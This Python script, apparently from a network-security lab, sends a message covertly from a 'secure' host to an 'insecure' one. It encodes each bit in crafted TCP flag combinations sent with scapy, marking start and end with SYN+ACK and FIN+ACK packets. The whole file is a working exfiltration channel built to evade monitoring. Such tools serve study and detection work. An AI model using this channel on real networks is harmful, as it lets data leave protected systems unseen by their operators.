import argparse
import os
import time
import random
import sys
from scapy.all import IP, TCP, send, Packet

def text_to_bits(text, encoding='utf-8'):
    """Converts a text string to its binary representation."""
    bits = bin(int.from_bytes(text.encode(encoding), 'big'))[2:]
    return bits.zfill(8 * ((len(bits) + 7) // 8))

def send_covert_packet(ip_layer, dest_port, flags_to_set, delay):
    """Crafts and sends a TCP packet with specified flags."""
    src_port = random.randint(1024, 65535) 
    seq_num = random.randint(0, 2**32 - 1)
    ack_num = random.randint(0, 2**32 - 1) 

    tcp_layer = TCP(sport=src_port, dport=dest_port, flags=flags_to_set, seq=seq_num, ack=ack_num)
    packet = ip_layer / tcp_layer

    try:
        send(packet, verbose=0)
        time.sleep(delay)
    except Exception as e:
        print(f"Error sending packet: {e}", file=sys.stderr)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Covert Channel Sender using TCP Flags (ACK+URG=1, ACK+PSH=0)")
    parser.add_argument("message", help="The message string to send covertly.")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Inter-packet delay in seconds (default: 0.1).")
    parser.add_argument("-p", "--port", type=int, default=31337, help="Covert destination port (default: 31337).")
    parser.add_argument("--dest", default="insec", help="Destination hostname (must be in /etc/hosts, default: insec).")

    args = parser.parse_args()

    DEST_HOST = args.dest 
    COVERT_PORT = args.port
    INTER_PACKET_DELAY = args.delay
    MESSAGE = args.message

    START_FLAGS = 'SA' 
    END_FLAGS = 'FA'   
    BIT_1_FLAGS = 'UA' 
    BIT_0_FLAGS = 'PA' 

    dest_ip = os.getenv('INSECURENET_HOST_IP')
    src_ip = os.getenv('SECURENET_HOST_IP')

    if not dest_ip:
        print("Error: INSECURENET_HOST_IP environment variable not set.", file=sys.stderr)
        sys.exit(1)
    if not src_ip:
        print("Error: SECURENET_HOST_IP environment variable not set.", file=sys.stderr)
        sys.exit(1)

    print(f"Sender Config:")
    print(f"  Source IP:      {src_ip}")
    print(f"  Destination IP: {dest_ip} (Targeting host '{DEST_HOST}')")
    print(f"  Covert Port:    {COVERT_PORT}")
    print(f"  Inter-Packet Delay: {INTER_PACKET_DELAY}s")
    print(f"  Message:        '{MESSAGE}'")
    print("-" * 20)

    ip_layer = IP(src=src_ip, dst=dest_ip)

    bits_to_send = text_to_bits(MESSAGE)
    if not bits_to_send:
        print("Error: Could not convert message to bits.", file=sys.stderr)
        sys.exit(1)

    print(f"Sending {len(bits_to_send)} bits for the message.")

    print(f"[SENDER_TIMESTAMP_START] {time.time():.6f}")
    start_time = time.time()

    print(f"Sending Start of Message (SoM) marker ({START_FLAGS})...")
    send_covert_packet(ip_layer, COVERT_PORT, START_FLAGS, INTER_PACKET_DELAY)

    print("Sending data bits:")
    for i, bit in enumerate(bits_to_send):
        if bit == '1':
            print(f"  Sending bit {i+1}/{len(bits_to_send)}: 1 ({BIT_1_FLAGS})")
            send_covert_packet(ip_layer, COVERT_PORT, BIT_1_FLAGS, INTER_PACKET_DELAY)
        else: 
            print(f"  Sending bit {i+1}/{len(bits_to_send)}: 0 ({BIT_0_FLAGS})")
            send_covert_packet(ip_layer, COVERT_PORT, BIT_0_FLAGS, INTER_PACKET_DELAY)
    print("Finished sending data bits.")

    print(f"Sending End of Message (EoM) marker ({END_FLAGS})...")
    send_covert_packet(ip_layer, COVERT_PORT, END_FLAGS, INTER_PACKET_DELAY)

    end_time = time.time()

    print("-" * 20)
    print("Covert message sending sequence complete.")
    print(f"Total time elapsed: {end_time - start_time:.3f} seconds")